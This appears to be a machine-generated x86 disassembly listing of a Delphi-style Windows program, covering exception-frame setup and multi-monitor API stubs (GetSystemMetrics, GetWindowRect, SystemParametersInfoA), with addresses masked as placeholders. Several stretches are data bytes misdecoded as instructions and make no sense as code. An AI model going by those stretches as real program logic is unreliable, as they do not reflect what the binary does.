mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_422174
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403224
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4221b8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413808
mov eax esi
pop esi
pop ebx
retn
sub_4221e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422209
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422210
retn
sub_4222d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4222fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422304
retn
sub_422310
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40440c
xor eax eax
push ebp
push sub_4223cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4223d6
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40441c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_422310
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403f5c
sub_4223f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_422310
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_422480
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_422310
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_422510
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_422310
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_422480
sub_4225a6
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_422310
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_422627
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_422310
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_422714
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_422310
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4227e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_422310
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_4228bc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_422310
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_422a57
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_422a7d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422a84
retn
sub_422a98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422abd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ac4
retn
sub_422bb8
unpckhps xmm1 [ ecx + 0x53 ]
jo r-xdata
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
js r-xdata
add bh bh
dec [ ebp + 0x2c780040 ]
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
inc eax
inc edx
add [ eax ] al
add [ eax ] al
push esi
je r-xdata
jb r-xdata
sub eax [ edx ]
add [ esi - 0x6d ] esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c ] bh
outsb
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
js r-xdata
cld
sub eax [ edx ]
add [ esi - 0x6d ] esp
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc eax
add [ esp + esi + 0x40 ] dl
add ah ah
insd
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
dec eax
insb
jo r-xdata
inc edx
or [ eax + 0x65 ] ecx
insb
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
sub eax [ edx ]
outsb
je r-xdata
add bh bh
dec [ ebx + 0x422bf8c0 ]
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_423863
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
int3
mov eax eax
imul ebp [ edi + 0x6e ] 0xdc00408d
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
sub al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
sub al 0x42
add [ eax + eax ] cl
add [ eax ] al
mov al [ 0x54004010 ]
xor al 0x40
add [ eax + 0x34 ] ah
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] ch
inc eax
add [ esp + esi + 0x40 ] bl
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + ebp ] bh
inc eax
add al bl
xor [ eax ] eax
adc al 0x32
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
jns r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
add al al
dec edi
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
in al 0x6d
sub al 0x42
popad
outsb
popad
jb r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fb0
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
insb
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
sub eax [ edx ]
add bh bh
jo r-xdata
or [ eax + 0x65 ] ecx
insb
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
jmp r-xdata
movlps [ ecx + 0x45 ] xmm1
js r-xdata
add bh bh
dec [ ebx + 0x422b7cc0 ]
add [ edi ] cl
lodsd [ esi ]
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x2b3c7265
inc edx
add [ ecx ] al
xchg bx ax
adc ecx [ ecx + 0x45 ]
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x2b787265
inc edx
add [ ecx ] al
xchg bx ax
add [ ecx + esi + 0x31d80040 ] bh
inc eax
add [ edx + esi ] dl
inc eax
add [ eax * 2 + 0x706c6548 ] dl
push ebx
inc eax
outsb
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42386a
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049d8
lea eax [ ebp - 0x8 ]
call sub_405598
retn
inc ebx
xor edi edi
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
jo r-xdata
cmp cl [ ecx ]
jae r-xdata
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4220d0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422ac4
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc [ eax + 0x2b ]
inc edx
lodsd [ esi ]
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
jae r-xdata
adc eax 0x65705349
je r-xdata
dec [ ebx + 0x422b0cc0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
insd
dec eax
insb
jo r-xdata
sub_422e94
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_422f0a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_423020
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4055b0
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422f11
lea eax [ ebp - 0x8 ]
call sub_405598
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_422fac
mov [ rw-data ] eax
sub_422f18
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_422fac
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4055dc
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_422f70
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4055b0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_422fac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031f4
mov dl 0x1
mov eax [ r-xdata ]
call sub_422094
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422094
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_422094
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403f5c
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax esi
pop esi
pop ebx
retn
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_423020
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_423121
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220e4
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cce0
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405598
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cce0
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220e4
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_422f70
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_4220e4
mov ecx r-xdata
call sub_4055dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423128
lea eax [ ebp - 0xc ]
call sub_405598
lea eax [ ebp - 0x8 ]
call sub_405598
retn
sub edx 0xfffffff8
sub_423140
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_423180
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_4231b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_423342
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4232dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423349
lea eax [ ebp - 0x10 ]
call sub_403f5c
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4ac
call sub_403998
mov eax esi
xor edx edx
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4220d0
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403224
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4220d0
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_423350
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_423435
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fb0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42343c
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049d8
lea eax [ ebp - 0x8 ]
call sub_405598
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4220d0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4220d0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055b0
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4055dc
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42366c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
